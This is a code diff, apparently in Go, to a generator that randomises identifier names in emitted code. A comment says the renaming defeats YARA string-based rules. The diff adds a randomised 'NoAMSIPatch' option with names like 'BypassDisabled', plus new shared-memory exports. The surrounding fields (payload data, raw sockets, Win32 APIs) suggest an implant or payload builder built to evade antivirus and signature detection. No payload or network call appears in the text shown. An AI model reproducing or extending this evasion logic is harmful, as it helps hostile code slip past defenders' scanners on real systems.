@@ -41,8 +41,9 @@ type polyConfig struct {
 	FieldPayload    string // replaces "WASMData"
 	FieldRawNet     string // replaces "RawSockets"
 	FieldSysAPIs    string // replaces "Win32APIs"
-	FieldDarwinAPIs string // replaces "DarwinAPIs"
-	FieldMounts     string // replaces "FSMounts"
+	FieldDarwinAPIs  string // replaces "DarwinAPIs"
+	FieldMounts      string // replaces "FSMounts"
+	FieldNoAMSIPatch string // replaces "NoAMSIPatch"
 
 	// Mirror table identifier replacements (kills YARA string-based rules).
 	MirrorWritable string // replaces "MirrorWritable"
@@ -325,6 +326,9 @@ var darwinAPIFieldNames = []string{
 var mountFieldNames = []string{
 	"DirMounts", "VolumePaths", "MountDirs", "HostDirs", "FSDirs",
 }
+var noAMSIPatchFieldNames = []string{
+	"SkipScanPatch", "DisableHook", "BypassDisabled", "NoScanFix", "RawMode",
+}
 
 // Mirror table identifier pools — generic names that blend into any Go codebase.
 var mirrorWritableNames = []string{
@@ -477,6 +481,10 @@ func newPolyConfig(ghostName string) (*polyConfig, error) {
 		return nil, err
 	}
 	pc.FieldMounts, err = randChoice(mountFieldNames)
+	if err != nil {
+		return nil, err
+	}
+	pc.FieldNoAMSIPatch, err = randChoice(noAMSIPatchFieldNames)
 	if err != nil {
 		return nil, err
 	}
@@ -958,6 +966,7 @@ func (pc *polyConfig) replacements() []stringPair {
 		{"RawSockets", pc.FieldRawNet},
 		{"Win32APIs", pc.FieldSysAPIs},
 		{"DarwinAPIs", pc.FieldDarwinAPIs},
+		{"NoAMSIPatch", pc.FieldNoAMSIPatch},
 		{"FSMounts", pc.FieldMounts},
 
 		// Mirror table identifiers (longest first to prevent partial matches).
@@ -1231,6 +1240,7 @@ func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
 	b.WriteString(fmt.Sprintf("\t\t%s: %v,\n", pc.FieldRawNet, cfg.RawSockets))
 	b.WriteString(fmt.Sprintf("\t\t%s:  %v,\n", pc.FieldSysAPIs, cfg.Win32APIs))
 	b.WriteString(fmt.Sprintf("\t\t%s: %v,\n", pc.FieldDarwinAPIs, cfg.DarwinAPIs))
+	b.WriteString(fmt.Sprintf("\t\t%s: %v,\n", pc.FieldNoAMSIPatch, cfg.NoAMSIPatch))
 	b.WriteString(fmt.Sprintf("\t\t%s:   %s,\n", pc.FieldMounts, formatStringSlice(cfg.FSMounts)))
 	b.WriteString("\t}\n\n")
 
@@ -2088,7 +2098,7 @@ var exportedAnonymizedNames = []string{
 	// Extension API
 	"ext_getfunc", "ext_readout", "ext_resetout", "ext_callback",
 	// Shadow memory
-	"shm_alloc", "shm_protect", "shm_free",
+	"shm_alloc", "shm_protect", "shm_free", "shm_host_addr", "shm_call_entry",
 	// Darwin / macOS frameworks
 	"fw_available", "fw_load", "fw_sym", "fw_call", "fw_call_m", "fw_call_raw",
 	"fw_mem_r", "fw_mem_w",
